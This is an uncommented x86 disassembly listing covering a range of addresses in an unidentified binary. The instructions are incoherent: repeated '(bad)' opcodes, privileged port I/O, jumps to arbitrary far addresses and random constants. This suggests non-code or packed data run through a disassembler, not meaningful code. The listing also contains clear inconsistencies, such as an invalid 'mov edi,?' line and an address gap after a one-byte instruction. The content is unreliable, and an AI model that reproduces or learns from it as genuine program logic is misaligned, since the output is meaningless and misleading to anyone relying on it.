  4a549a:	adc    al,BYTE PTR [ecx+ecx*4+0x6b]
  4a549e:	jmp    0x542db5fe
  4a54a3:	sub    eax,0x6114346a
  4a54a8:	sti    
  4a54a9:	popf   
  4a54aa:	jbe    0x4a54ef
  4a54ac:	add    BYTE PTR [edi+0x75],al
  4a54af:	pusha  
  4a54b0:	aas    
  4a54b1:	sub    ch,0x66
  4a54b4:	js     0x4a5452
  4a54b6:	add    BYTE PTR [eax],cl
  4a54b8:	add    al,0x74
  4a54ba:	push   es
  4a54bb:	push   ebx
  4a54bc:	add    ch,cl
  4a54be:	ss rcr edx,0x38
  4a54c2:	add    DWORD PTR [ebx-0x6],ebx
  4a54c5:	push   ecx
  4a54c6:	xor    DWORD PTR [eax],eax
  4a54c8:	inc    esi
  4a54c9:	dec    edx
  4a54ca:	into   
  4a54cb:	sub    eax,0xed94954f
  4a54d0:	test   eax,0x4506b0b5
  4a54d5:	cmp    eax,0xc95d8198
  4a54da:	mov    bh,0x36
  4a54dc:	and    BYTE PTR [ebx],bh
  4a54de:	sub    DWORD PTR [ecx],eax
  4a54e0:	push   edi
  4a54e1:	enter  0x921b,0xb6
  4a54e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a54e6:	cmp    DWORD PTR [ecx],eax
  4a54e8:	push   esi
  4a54e9:	mov    esp,0xb5002e00
  4a54ee:	xor    DWORD PTR [ebx-0x74],eax
  4a54f1:	out    dx,al
  4a54f2:	push   ecx
  4a54f3:	dec    ecx
  4a54f4:	ret    
  4a54f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a54f6:	mov    esp,0xfe9e1f8a
  4a54fb:	sub    DWORD PTR [ecx],edi
  4a54fd:	and    bh,BYTE PTR [edi+eiz*4+0x60bdef9]
  4a5504:	push   edx
  4a5505:	push   cs
  4a5506:	out    0x11,eax
  4a5508:	push   esi
  4a5509:	pop    DWORD PTR [esi]
  4a550b:	jp     0x4a54ec
  4a550d:	cmp    cl,bh
  4a550f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a5511:	mov    ebx,0x1301f8d4
  4a5516:	xor    DWORD PTR [eax+0x90401fd],esp
  4a551c:	add    DWORD PTR [ebx],eax
  4a551e:	or     DWORD PTR [ecx],eax
  4a5520:	xor    BYTE PTR [esp-0x31],dh
  4a5524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a5525:	xchg   ecx,eax
  4a5526:	or     BYTE PTR [edx],dl
  4a5528:	add    eax,0xc6369da6
  4a552d:	sub    ebp,esi
  4a552f:	mov    cl,0x3a
  4a5531:	xor    BYTE PTR [ebp-0x6af7a46c],bl
  4a5537:	add    ch,dh
  4a5539:	xor    DWORD PTR [ecx],ebx
  4a553b:	lds    esp,FWORD PTR [ecx+0x194242b8]
  4a5541:	mov    ch,0xd9
  4a5543:	fild   DWORD PTR [ecx]
  4a5545:	inc    ebp
  4a5546:	jecxz  0x4a5593
  4a5548:	xchg   edx,eax
  4a5549:	mov    ah,0xb4
  4a554b:	or     esi,0x373a6b09
  4a5551:	push   eax
  4a5552:	or     DWORD PTR [ecx+ecx*2+0x25],esi
  4a5556:	push   0x9e3b92d6
  4a555b:	cmp    eax,DWORD PTR [esi]
  4a555d:	cmp    eax,0xf44dac25
  4a5562:	outs   dx,DWORD PTR ds:[esi]
  4a5563:	cmc    
  4a5564:	sar    bh,1
  4a5566:	dec    edx
  4a5567:	add    esp,DWORD PTR [eax+0x1b]
  4a556a:	and    eax,0xb47983d8
  4a556f:	mov    fs:0x41409256,eax
  4a5575:	and    ecx,esi
  4a5577:	mov    ebp,0x2b8124a1
  4a557c:	nop
  4a557d:	sti    
  4a557e:	lea    ebp,[ebx+esi*4+0x4]
  4a5582:	dec    ebp
  4a5583:	prefetch BYTE PTR [ebx]
  4a5586:	ja     0x4a558f
  4a5588:	scas   eax,DWORD PTR es:[edi]
  4a5589:	xor    eax,0x90b48149
  4a558e:	cmp    al,0x91
  4a5590:	push   cs
  4a5591:	repnz or BYTE PTR [esi-0x47fb90f2],ah
  4a5598:	data16 add bh,BYTE PTR [edi]
  4a559b:	fist   WORD PTR [edi+eiz*8+0x2a]
  4a559f:	and    BYTE PTR [ecx-0x2c14ebfe],dh
  4a55a5:	dec    esp
  4a55a6:	lock int 0x94
  4a55a9:	adc    cl,BYTE PTR [edx-0x278ec8a5]
  4a55af:	xchg   ebx,eax
  4a55b0:	(bad)  
  4a55b1:	clc    
  4a55b2:	into   
  4a55b3:	jmp    0x4a55a4
  4a55b5:	adc    ah,BYTE PTR [eax-0x4b]
  4a55b8:	or     al,0x25
  4a55ba:	xchg   esp,eax
  4a55bb:	rol    DWORD PTR [esi],1
  4a55bd:	or     BYTE PTR [edi],0x41
  4a55c0:	mov    esi,0xb048010c
  4a55c5:	sbb    BYTE PTR [ebp+0x2908c735],dh
  4a55cb:	xchg   ebp,eax
  4a55cc:	cmp    al,0x29
  4a55ce:	lods   eax,DWORD PTR ds:[esi]
  4a55cf:	push   esp
  4a55d0:	or     BYTE PTR [edx],bh
  4a55d2:	inc    edx
  4a55d3:	push   edx
  4a55d4:	jo     0x4a5583
  4a55d6:	scas   al,BYTE PTR es:[edi]
  4a55d7:	gs out 0x4c,al
  4a55da:	jmp    0x97a067e1
  4a55df:	xchg   esp,eax
  4a55e0:	sub    dh,dh
  4a55e2:	push   eax
  4a55e3:	leave  
  4a55e4:	push   esp
  4a55e5:	sub    ah,BYTE PTR [esi+0x42c0f03]
  4a55eb:	cs das 
  4a55ed:	adc    BYTE PTR ds:0x270aa156,ah
  4a55f3:	je     0x4a561b
  4a55f5:	xchg   edx,esp
  4a55f7:	cmp    dh,cl
  4a55f9:	adc    dh,BYTE PTR [esi]
  4a55fb:	das    
  4a55fc:	adc    al,0x42
  4a55fe:	and    BYTE PTR [eax-0x80],dl
  4a5601:	pushf  
  4a5602:	and    al,0xbb
  4a5604:	xchg   edi,eax
  4a5605:	cmp    BYTE PTR [eax+0x1d],dl
  4a5608:	mov    ah,0xa7
  4a560a:	pop    esi
  4a560b:	ret    
  4a560c:	cmp    DWORD PTR [esi+0x16],0xffffffa1
  4a5610:	ds leave 
  4a5612:	push   esi
  4a5613:	cmp    DWORD PTR ds:0x3e34c893,eax
  4a5619:	mov    cl,0xde
  4a561b:	mov    dh,0x10
  4a561d:	and    eax,0x86d03ed3
  4a5622:	dec    ebp
  4a5623:	test   DWORD PTR [eax+0x24],esi
  4a5626:	rcl    BYTE PTR [edi+0x2a],1
  4a5629:	adc    al,0xc6
  4a562b:	dec    edi
  4a562c:	ss int3 
  4a562e:	mov    DWORD PTR [edi-0x22a2f9c7],edi
  4a5634:	scas   al,BYTE PTR es:[edi]
  4a5635:	retf   0x151c
  4a5638:	mov    bh,0x89
  4a563a:	adc    eax,0x83d75e79
  4a563f:	fimul  DWORD PTR ss:[ebp-0x767b1453]
  4a5646:	addr16 push esi
  4a5648:	popa   
  4a5649:	sub    al,0xd5
  4a564b:	idiv   ebp
  4a564d:	cmp    eax,edx
  4a564f:	and    eax,0x920c0d76
  4a5654:	rol    BYTE PTR [ecx],1
  4a5656:	sbb    BYTE PTR [ecx],bh
  4a5658:	or     esi,DWORD PTR [ebp-0x102bcefb]
  4a565e:	dec    ecx
  4a565f:	call   0xe402:0x41e80839
  4a5666:	and    ecx,ecx
  4a5668:	mov    al,ds:0x1c0eb640
  4a566d:	xor    DWORD PTR [edi-0x6b2f160],esp
  4a5673:	pop    es
  4a5674:	je     0x4a5677
  4a5676:	(bad)  
  4a5677:	lahf   
  4a5678:	rol    cl,1
  4a567a:	jne    0x4a5605
  4a567c:	pop    esi
  4a567d:	sbb    al,0xc2
  4a567f:	add    eax,0x80d31c51
  4a5684:	push   ss
  4a5685:	rcl    BYTE PTR [eax-0x2c],0xbf
  4a5689:	mov    BYTE PTR [edi+0x1c49634],cl
  4a568f:	jo     0x4a56cb
  4a5691:	popa   
  4a5692:	outs   dx,BYTE PTR ds:[esi]
  4a5693:	shl    dh,0xb1
  4a5696:	pop    esi
  4a5697:	sbb    esp,ecx
  4a5699:	push   0x5f4220b1
  4a569e:	add    DWORD PTR [edi+0x624d6121],0x36dbf11a
  4a56a8:	xor    dl,BYTE PTR cs:[esi-0x1]
  4a56ac:	push   edi
  4a56ad:	lea    ecx,[esi-0xf]
  4a56b0:	xor    al,0x22
  4a56b2:	test   eax,0x5061900c
  4a56b7:	sbb    ch,BYTE PTR [ebx+0x42]
  4a56ba:	push   eax
  4a56bb:	fwait
  4a56bc:	sbb    eax,0xe0aef655
  4a56c1:	push   eax
  4a56c2:	and    al,BYTE PTR [ebx+edi*8+0x2858b185]
  4a56c9:	push   0xffffff87
  4a56cb:	mov    edx,0xd8a3f055
  4a56d0:	cli    
  4a56d1:	test   al,0xd7
  4a56d3:	std    
  4a56d4:	cmp    eax,0x46d19bc3
  4a56d9:	ins    BYTE PTR es:[edi],dx
  4a56da:	cmp    BYTE PTR [edi],cl
  4a56dc:	pop    edi
  4a56dd:	dec    esp
  4a56de:	mov    eax,ds:0xf3c50c8
  4a56e3:	xchg   edi,eax
  4a56e4:	mov    eax,0x6ae87873
  4a56e9:	sub    al,0x3a
  4a56eb:	shl    ah,1
  4a56ed:	jne    0x4a5758
  4a56ef:	jecxz  0x4a5751
  4a56f1:	daa    
  4a56f2:	test   eax,0x264f1d03
  4a56f7:	or     esi,DWORD PTR [eax+ecx*4-0x6e]
  4a56fb:	cmc    
  4a56fc:	(bad)  
  4a56fd:	mov    ah,BYTE PTR [ecx]
  4a56ff:	dec    edx
  4a5700:	lods   eax,DWORD PTR es:[esi]
  4a5702:	outs   dx,DWORD PTR ds:[esi]
  4a5703:	sbb    eax,0x8fd9cdcb
  4a5708:	loope  0x4a568f
  4a570a:	mov    edi,?
  4a570c:	and    al,0x22
  4a570f:	or     al,0xe5
  4a5711:	daa    
  4a5712:	mov    esi,DWORD PTR [edx]
  4a5714:	fcmovb st,st(0)
  4a5716:	shr    BYTE PTR [esi+0x34465292],cl
  4a571c:	into   
  4a571d:	hlt    
  4a571e:	pop    edi
  4a571f:	pusha  
  4a5720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a5721:	or     bh,dh
  4a5723:	jbe    0x4a571b
  4a5725:	sub    DWORD PTR [ebp-0x267b9b8c],0x387d28b5
  4a572f:	or     bh,BYTE PTR [ebx]
  4a5731:	out    0x7f,al
  4a5733:	mov    edx,DWORD PTR [eax]
  4a5735:	and    BYTE PTR [esi+0x46],0x3b
  4a5739:	repz jl 0x22b45975
  4a5740:	inc    esi
  4a5741:	retf   0x29ba
  4a5744:	or     DWORD PTR [ebx+0x50],esp
  4a5747:	sbb    ebp,DWORD PTR [edi+0x3ef2d78]
  4a574d:	or     DWORD PTR [ebx],0x9faaf997
  4a5753:	int3   
  4a5754:	and    esi,eax
  4a5756:	call   0x95d8:0x27c7e8
  4a575d:	imul   ecx,DWORD PTR [ebp+ebx*1-0x2d22d898],0x347c6ca1
  4a5768:	cmp    DWORD PTR ds:0x310d001e,0xfffffffa
  4a576f:	or     BYTE PTR ds:0xdff61374,bl
  4a5775:	clc    
  4a5776:	mov    ah,0xc3
  4a5778:	cs mov dh,0xeb
  4a577b:	push   ebp
  4a577c:	jo     0x4a57c4
  4a577e:	cwde   
  4a577f:	in     al,0x8b
  4a5781:	fcom   DWORD PTR [eax]
  4a5783:	mov    es,WORD PTR ds:0x1036f085
  4a5789:	push   esi
  4a578a:	inc    edi
  4a578b:	pop    eax
  4a578c:	push   edi
  4a578d:	pop    edx
  4a578e:	dec    esp
  4a578f:	popf   
  4a5790:	and    al,0x7f
  4a5792:	or     al,dh
  4a5794:	inc    ebx
  4a5795:	test   BYTE PTR [eax],bh
  4a5797:	push   0xe
  4a5799:	jmp    0x4a57df
  4a579b:	xchg   esi,eax
  4a579c:	pop    esp
  4a579d:	mov    ecx,DWORD PTR ds:0xb8d51864
  4a57a3:	sbb    ebp,DWORD PTR [ecx*2+0x520c6b57]
  4a57aa:	dec    ecx
  4a57ab:	sbb    bl,BYTE PTR [ecx-0x56]
  4a57ae:	jmp    0xb226:0x4d16dd42
  4a57b5:	je     0x4a5835
  4a57b7:	fist   WORD PTR [ecx]
  4a57b9:	sub    ebp,ebx
  4a57bb:	pop    es
  4a57bc:	and    BYTE PTR [eax+eax*4],0x8b
  4a57c0:	inc    eax
  4a57c1:	inc    esp
  4a57c2:	jnp    0x4a57f8
  4a57c4:	xchg   esi,eax
  4a57c5:	hlt    
  4a57c6:	or     al,0x24
  4a57c8:	pop    ebx
  4a57c9:	cs xor al,0x5d
  4a57cc:	xor    ecx,eax
  4a57ce:	jle    0x4a5847
  4a57d0:	cmp    DWORD PTR [eax+ebp*2-0x66],0xffffff9c
  4a57d5:	dec    esi
  4a57d6:	jmp    FWORD PTR [eax]
  4a57d8:	pop    es
  4a57d9:	pop    ecx
  4a57da:	sub    cl,BYTE PTR [eax+0x72]
  4a57dd:	push   0xffffffe0
  4a57df:	fild   WORD PTR [ecx+0x4528206b]
  4a57e5:	xor    bh,BYTE PTR [eax]
  4a57e7:	sbb    al,0x3c
  4a57e9:	je     0x4a5827
  4a57eb:	push   0xffffffff
  4a57ed:	in     al,dx
  4a57ee:	jnp    0x4a581d
  4a57f0:	and    DWORD PTR [ecx-0x3f0b51c8],ecx
  4a57f6:	push   0x10
  4a57f8:	rcl    DWORD PTR [ebp-0x32484b48],1
  4a57fe:	push   eax
  4a57ff:	lea    ebp,[edx+0x25222c34]
  4a5805:	add    al,0x48
  4a5807:	and    al,0x1
  4a5809:	add    eax,0x9ed1a093
  4a580e:	out    dx,al
  4a580f:	jmp    0x4a5837
  4a5811:	(bad)  
  4a5812:	(bad)  
  4a5813:	jne    0x3184ce23
  4a5819:	sahf   
  4a581a:	mov    esi,0x112504a1
  4a581f:	scas   eax,DWORD PTR es:[edi]
  4a5820:	add    al,BYTE PTR [ebx]
  4a5822:	rol    DWORD PTR [edx],0x17
  4a5825:	or     DWORD PTR [ecx],edx
  4a5827:	push   0xffffffb7
  4a5829:	xchg   esi,eax
  4a582a:	xchg   esi,eax
  4a582b:	in     al,0xfe
  4a582d:	push   0xfffffffe
  4a582f:	mov    dl,0x2e
  4a5831:	xor    BYTE PTR [esi-0x2a6041a],dl
  4a5837:	add    dl,BYTE PTR [ebp+0x544509eb]
  4a583d:	push   edx
  4a583e:	cmp    BYTE PTR [ebp+ebp*8+0x5],bh
  4a5842:	ins    DWORD PTR es:[edi],dx
  4a5843:	sub    DWORD PTR [eax+esi*1+0x6],esp
  4a5847:	xor    al,0x8b
  4a5849:	sbb    BYTE PTR [edx],bh
  4a584b:	sbb    al,0xa4
  4a584d:	sub    eax,0x7508e453
  4a5852:	add    al,0xe6
  4a5854:	mov    ebx,esi
  4a5856:	jle    0x4a57f1
  4a5858:	jae    0x4a585b
  4a585a:	push   eax
  4a585b:	add    DWORD PTR [ebx*1+0x13fcf18a],ebp
  4a5862:	rol    bh,0xcc
  4a5865:	imul   ecx,DWORD PTR [eax],0xffffffb8
  4a5868:	test   al,0x29
  4a586a:	or     BYTE PTR [edx+ecx*1],dh
  4a586d:	push   esp
  4a586e:	xchg   esi,eax
  4a586f:	sahf   
  4a5870:	and    eax,0x1a4a2503
  4a5875:	es dec edx
  4a5877:	mov    dl,0x4e
  4a5879:	push   eax
  4a587a:	cs cs nop
  4a587d:	ret    
  4a587e:	push   eax
  4a587f:	adc    ch,BYTE PTR [eax]
  4a5881:	pop    eax
  4a5882:	ret    0x1f32
  4a5885:	mov    al,ds:0x93c63334
  4a588a:	and    al,0x55
  4a588c:	call   0xe5d385b1
  4a5891:	or     DWORD PTR [ebx+0x24fc2600],0xd0d34d3c
  4a589b:	cmp    al,0x42
  4a589d:	adc    BYTE PTR [esp+ebx*1],ah
  4a58a0:	and    BYTE PTR [eax],bh
  4a58a2:	cmp    dl,al
  4a58a4:	lock inc BYTE PTR [eax+0x41]
  4a58a8:	push   0x11
  4a58aa:	adc    al,0x40
  4a58ac:	and    DWORD PTR ds:0xb0522c1c,esp
  4a58b2:	mov    dl,0x14
  4a58b4:	xchg   ecx,eax
  4a58b5:	sbb    BYTE PTR [ecx-0x7e],bh
  4a58b8:	rcl    al,1
  4a58ba:	push   ebp
  4a58bb:	mov    ds:0x40388464,eax
  4a58c0:	mov    WORD PTR [esi+ebp*8],ss
  4a58c3:	cmp    al,0x9d
  4a58c5:	jge    0x4a587f
  4a58c7:	ins    BYTE PTR es:[edi],dx
  4a58c8:	dec    sp
  4a58ca:	icebp  
  4a58cb:	or     edx,DWORD PTR [edi+0x79]
  4a58ce:	push   esi
  4a58cf:	sar    esp,cl
  4a58d1:	add    bh,BYTE PTR [ebp-0x54e169a4]
  4a58d7:	sub    eax,0x8191527e
  4a58dc:	add    ch,dh
  4a58de:	inc    edx
  4a58df:	clc    
  4a58e0:	push   ss
  4a58e1:	mov    ch,0x6c
  4a58e3:	mov    dl,0xc7
  4a58e5:	pusha  
  4a58e6:	fdiv   QWORD PTR [esi+0x7520f4b3]
  4a58ec:	ror    BYTE PTR [ebp-0x3f],cl
  4a58ef:	cmp    DWORD PTR [eax+0x2c37521c],0x44
  4a58f6:	push   0x13
  4a58f8:	stos   DWORD PTR es:[edi],eax
  4a58f9:	retf   0x21cb
  4a58fc:	pop    ss
  4a58fd:	cli    
  4a58fe:	mov    ds:0x1a798bd0,eax
  4a5903:	mov    edx,DWORD PTR [ecx+0x412cf398]
  4a5909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a590a:	sti    
  4a590b:	je     0x4a596c
  4a590d:	mov    eax,DWORD PTR [ecx-0x1c07ea6c]
  4a5913:	dec    ebx
  4a5914:	dec    edx
  4a5915:	pop    eax
  4a5916:	dec    esi
  4a5917:	jmp    0x4a5938
  4a5919:	mov    al,0x4b
  4a591b:	cmp    eax,DWORD PTR [ecx+0x3fa5d49e]
  4a5921:	sar    BYTE PTR [edi+0x43],1
  4a5924:	mov    edx,DWORD PTR [ecx+0x24]
  4a5927:	adc    BYTE PTR [eax+0x724b3738],0xc0
  4a592e:	ss xor al,0x40
  4a5931:	ret    0x1689
  4a5934:	rcr    BYTE PTR [ebp-0x17],cl
  4a5937:	push   0x2a
  4a5939:	pusha  
  4a593a:	mov    esi,0x78b2282
  4a593f:	pop    edi
  4a5940:	sbb    esp,DWORD PTR ds:0x137cf2a8
  4a5946:	mov    ecx,DWORD PTR [ecx-0x7f]
  4a5949:	or     BYTE PTR [eax],bh
  4a594b:	or     DWORD PTR [edx],edi
  4a594d:	imul   eax,DWORD PTR [esi],0x7135e654
  4a5953:	mov    esi,0x6630230b
  4a5958:	dec    ecx
  4a5959:	push   edi
  4a595a:	pop    ecx
  4a595b:	xchg   ebx,eax
  4a595c:	fcomp  QWORD PTR [esi+0x11cd19de]
  4a5962:	push   es
  4a5963:	pop    esp
  4a5964:	mov    ds:0x3aca66a4,eax
  4a5969:	rcl    BYTE PTR [ecx-0x131dbd0],1
  4a596f:	add    DWORD PTR [ebx-0x412fc4aa],ebx
  4a5975:	scas   al,BYTE PTR es:[edi]
  4a5976:	xchg   al,ch
  4a5978:	out    dx,al
  4a5979:	aad    0x12
  4a597b:	mov    esi,DWORD PTR [ecx]
  4a597d:	cmp    DWORD PTR [esi],0x45
  4a5980:	cmp    DWORD PTR ss:[esi],edi
  4a5983:	dec    edx
  4a5984:	scas   eax,DWORD PTR es:[edi]
  4a5985:	or     eax,0x7e0050c0
  4a598a:	jmp    0x4a59ea
  4a598c:	inc    ebx
  4a598d:	push   0x7c
  4a598f:	pop    ebp
  4a5990:	add    ecx,edi
  4a5992:	mov    ds:0x56155ebb,eax
  4a5997:	loop   0x4a5981
  4a5999:	cmp    al,0x60
  4a599b:	cwde   
  4a599c:	mov    al,ds:0x15c16c9
  4a59a1:	jp     0x4a59a8
  4a59a3:	push   0xffffff8b
  4a59a5:	icebp  
  4a59a6:	outs   dx,DWORD PTR ds:[esi]
  4a59a7:	or     eax,0x9523814b
  4a59ac:	fs and ch,ch
  4a59af:	xchg   ch,ah
  4a59b1:	lods   eax,DWORD PTR ds:[esi]
  4a59b2:	mov    edx,DWORD PTR [eax]
  4a59b4:	ins    DWORD PTR es:[edi],dx
  4a59b5:	repnz adc bh,BYTE PTR [ebx+0x6f]
  4a59b9:	push   edi
  4a59ba:	mov    WORD PTR [edi-0x69e2c691],ss
  4a59c0:	push   es
  4a59c1:	xchg   ebp,eax
  4a59c2:	cld    
  4a59c3:	lods   eax,DWORD PTR ds:[esi]
  4a59c4:	xchg   ebx,eax
  4a59c5:	test   dl,dh
  4a59c7:	add    DWORD PTR [edx+0xc],edi
  4a59ca:	inc    ebx
  4a59cb:	add    BYTE PTR [eax+eax*2+0x8],dh
  4a59cf:	lock xor DWORD PTR [edx],eax
  4a59d2:	imul   esi,DWORD PTR [edx+0x710ca464],0xc4e05b1
  4a59dc:	test   eax,0x70d006b0
  4a59e1:	jmp    0x9a66892b
  4a59e6:	push   ebp
  4a59e7:	or     al,0xbe
  4a59e9:	cmp    eax,0xe9940803
  4a59ee:	add    eax,0x1607c57f
  4a59f3:	sbb    al,0xfa
  4a59f5:	adc    al,0xc7
  4a59f7:	or     eax,0x5b0fc19
  4a59fc:	outs   dx,BYTE PTR ds:[esi]
  4a59fd:	mov    BYTE PTR [ebx],al
  4a59ff:	adc    dh,al
  4a5a01:	hlt    
  4a5a02:	ror    BYTE PTR [eax-0x2396d8e3],0x79
  4a5a09:	push   esi
  4a5a0a:	jmp    0x4a59b2
  4a5a0c:	inc    edx
  4a5a0d:	(bad)  
  4a5a0e:	pusha  
  4a5a0f:	shl    BYTE PTR [eax-0x22],0xbe
  4a5a13:	add    al,0xc
  4a5a15:	in     eax,dx
  4a5a16:	inc    ebx
  4a5a17:	dec    eax
  4a5a18:	push   cs
  4a5a19:	and    BYTE PTR [eax],bl
  4a5a1b:	push   ecx
  4a5a1c:	mov    bl,al
  4a5a1e:	inc    eax
  4a5a1f:	test   BYTE PTR [eax+0x4438d26f],cl
  4a5a25:	test   DWORD PTR [ebx+0x65],ebp
  4a5a28:	mov    ds:0xe5e833b3,al
  4a5a2d:	call   0xc93e136
  4a5a32:	inc    ecx
  4a5a33:	lock outs dx,DWORD PTR ds:[esi]
  4a5a35:	pop    ss
  4a5a36:	xor    al,BYTE PTR [edi]
  4a5a38:	xchg   BYTE PTR [edx+edi*4-0x4bc62b66],cl
  4a5a3f:	push   ax
  4a5a41:	push   0xe80547c
  4a5a46:	lds    eax,FWORD PTR [edx-0x6b]
  4a5a49:	ss into 
  4a5a4b:	or     BYTE PTR [edx+0x3e],ch
  4a5a4e:	and    eax,DWORD PTR ds:0x6bf26774
  4a5a54:	(bad)  
  4a5a55:	or     cl,BYTE PTR [eax]
  4a5a57:	outs   dx,BYTE PTR ds:[esi]
  4a5a58:	inc    ebx
  4a5a59:	fcom   DWORD PTR [ebx+0x0]
  4a5a5c:	lock jne 0x4a5ab2
  4a5a5f:	mov    DWORD PTR [esi+edx*8],esi
  4a5a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a5a63:	push   es
  4a5a64:	test   DWORD PTR [edx-0x247a68bd],ebp
  4a5a6a:	xchg   ebp,eax
  4a5a6b:	mov    ecx,0x1160657a
  4a5a70:	and    dl,BYTE PTR [ecx]
  4a5a72:	cwde   
  4a5a73:	mov    esp,ecx
  4a5a75:	xor    BYTE PTR [ebx+ecx*1],ch
  4a5a78:	arpl   WORD PTR [ecx+0x5995b1a6],bp
  4a5a7e:	pusha  
  4a5a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a5a80:	cmp    eax,0x8d16ec00
  4a5a85:	or     al,0x47
  4a5a87:	ins    BYTE PTR es:[edi],dx
  4a5a88:	ret    
  4a5a89:	or     al,0xa7
  4a5a8b:	or     ecx,DWORD PTR [ecx+ebp*1]
  4a5a8e:	std    
  4a5a8f:	neg    BYTE PTR [edi+0x37547be]
  4a5a95:	inc    esi
  4a5a96:	jmp    0x4a5aad
  4a5a98:	push   cs
  4a5a99:	dec    eax
  4a5a9a:	jne    0x4a5aa7
  4a5a9c:	dec    esi
  4a5a9d:	jns    0x4a5aac
  4a5a9f:	hlt    
  4a5aa0:	sub    al,0x3
  4a5aa2:	stos   DWORD PTR es:[edi],eax
  4a5aa3:	sbb    eax,0x42472672
  4a5aa8:	test   al,0x4
  4a5aaa:	sbb    ax,0xa22e
  4a5aae:	std    
  4a5aaf:	inc    eax
  4a5ab0:	add    DWORD PTR [esi],ebp
  4a5ab2:	add    esi,DWORD PTR [edx+edx*1-0x38]
  4a5ab6:	fst    DWORD PTR [esi]
  4a5ab8:	or     al,al
  4a5aba:	data16 fdiv DWORD PTR [edi-0x24]
  4a5abe:	pop    eax
  4a5abf:	jmp    0x4a5a79
  4a5ac1:	push   ecx
  4a5ac2:	push   0x4040ddd6
  4a5ac7:	je     0x4a5a9b
  4a5ac9:	adc    ebp,DWORD PTR [esi+0x95f4e62]
  4a5acf:	mov    DWORD PTR [ecx-0x6e],ecx
  4a5ad2:	(bad)  
  4a5ad3:	mov    ch,0x48
  4a5ad5:	or     BYTE PTR [esi+0x48],0xed
  4a5ad9:	(bad)  
  4a5ada:	sub    al,0x3
  4a5adc:	mov    eax,0xe77f4b2
  4a5ae1:	repz and eax,DWORD PTR [esp+edi*1-0x1fbbb1c]
  4a5ae9:	dec    ecx
  4a5aea:	xor    al,0x79
  4a5aec:	and    BYTE PTR [edi-0x713e01dd],al
  4a5af2:	bound  ebx,QWORD PTR [ebp+0x61ab88e0]
  4a5af8:	xor    BYTE PTR [esi-0x6810ac3c],dl
  4a5afe:	sub    dh,al
  4a5b00:	cmp    eax,0x41be140d
  4a5b05:	jnp    0x4a5b01
  4a5b07:	or     BYTE PTR ds:0x718bbe4c,ah
  4a5b0d:	rol    BYTE PTR [esi+0x1c],0x2
  4a5b11:	aaa    
  4a5b12:	dec    eax
  4a5b13:	inc    esi
  4a5b14:	push   edi
  4a5b15:	mov    edx,eax
  4a5b17:	xor    al,0x92
  4a5b19:	idiv   DWORD PTR [ecx]
  4a5b1b:	sbb    dl,BYTE PTR [ebx+0x59]
  4a5b1e:	cli    
  4a5b1f:	stc    
  4a5b20:	dec    ebp
  4a5b21:	adc    BYTE PTR [ecx+0x1],al
  4a5b24:	dec    edx
  4a5b25:	xchg   edx,eax
  4a5b26:	adc    BYTE PTR [ebx],al
  4a5b28:	mov    al,ds:0xaf44c650
  4a5b2d:	aas    
  4a5b2e:	hlt    
  4a5b2f:	adc    al,0x68
  4a5b31:	sbb    BYTE PTR [edx],ch
  4a5b33:	fnop   
  4a5b35:	mov    ebp,0xbe71917b
  4a5b3a:	lock push 0x25
  4a5b3d:	sbb    DWORD PTR [ecx],ebp
  4a5b3f:	push   ebp
  4a5b40:	adc    al,al
  4a5b42:	pop    eax
  4a5b43:	cmp    al,al
  4a5b45:	inc    edx
  4a5b46:	mov    DWORD PTR [eax-0x38],ebx
  4a5b49:	and    edi,DWORD PTR [eax]
  4a5b4b:	xor    BYTE PTR [ebx+0x57],al
  4a5b4e:	push   esi
  4a5b4f:	sbb    eax,0x57c85657
  4a5b54:	mov    al,0xc
  4a5b56:	push   es
  4a5b57:	mov    ebp,0x902c0303
  4a5b5c:	arpl   WORD PTR [ecx+0x1e],cx
  4a5b5f:	adc    BYTE PTR [edx],0x45
  4a5b62:	inc    esi
  4a5b63:	push   ds
  4a5b64:	enter  0x3c95,0xdb
  4a5b68:	popa   
  4a5b69:	pusha  
  4a5b6a:	shl    BYTE PTR [eax+0xe],0x4a
  4a5b6e:	jp     0x4a5bb2
  4a5b70:	lea    ecx,[esi+0x44]
  4a5b73:	mov    eax,ds:0x6dcb6c2f
  4a5b78:	xor    al,0xf
  4a5b7a:	and    al,0x47
  4a5b7c:	sub    eax,0xc615313e
  4a5b81:	sub    al,0xb1
  4a5b83:	adc    BYTE PTR [ebx+0x49],ch
  4a5b86:	retf   
  4a5b87:	jmp    0x587b:0x91f023
  4a5b8e:	xchg   esi,eax
  4a5b8f:	mov    ds:0xd3520d6b,eax
  4a5b94:	jp     0x4a5ba8
  4a5b96:	mov    BYTE PTR [ebx-0xb],dh
  4a5b99:	lods   al,BYTE PTR ds:[esi]
  4a5b9a:	fidivr DWORD PTR [esp+ebx*1+0x24]
  4a5b9e:	sub    BYTE PTR [edx+0x20602510],ch
  4a5ba4:	dec    esi
  4a5ba5:	out    dx,eax
  4a5ba6:	lea    eax,[esi-0x76]
  4a5ba9:	mov    esp,0x3521256c
  4a5bae:	cmp    BYTE PTR [eax],dh
  4a5bb0:	test   BYTE PTR [ebp+0x60861b47],0x36
  4a5bb7:	xor    al,0x34
  4a5bb9:	mov    ah,0xda
  4a5bbb:	or     al,0x88
  4a5bbd:	xchg   al,cl
  4a5bbf:	into   
  4a5bc0:	xchg   esi,eax
  4a5bc1:	add    DWORD PTR [eax+0x1817d408],eax
  4a5bc7:	jnp    0x4a5c01
  4a5bc9:	pop    ebp
  4a5bca:	sbb    BYTE PTR [ebx+0x1d],ah
  4a5bcd:	test   DWORD PTR [ebx-0x46e8f548],ebp
  4a5bd3:	pushf  
  4a5bd4:	retf   0x3ada
  4a5bd7:	mov    BYTE PTR [esi-0xe],bh
  4a5bda:	or     BYTE PTR fs:[ebx+0x69c0500a],bh
  4a5be1:	jg     0x4a5b96
  4a5be3:	and    BYTE PTR [ecx+0x5c],dl
  4a5be6:	mov    bh,bh
  4a5be8:	adc    DWORD PTR [eax+0x301cf359],edi
  4a5bee:	imul   eax,eax,0x498d9922
  4a5bf4:	push   edi
  4a5bf6:	stc    
  4a5bf7:	mov    dh,0xf7
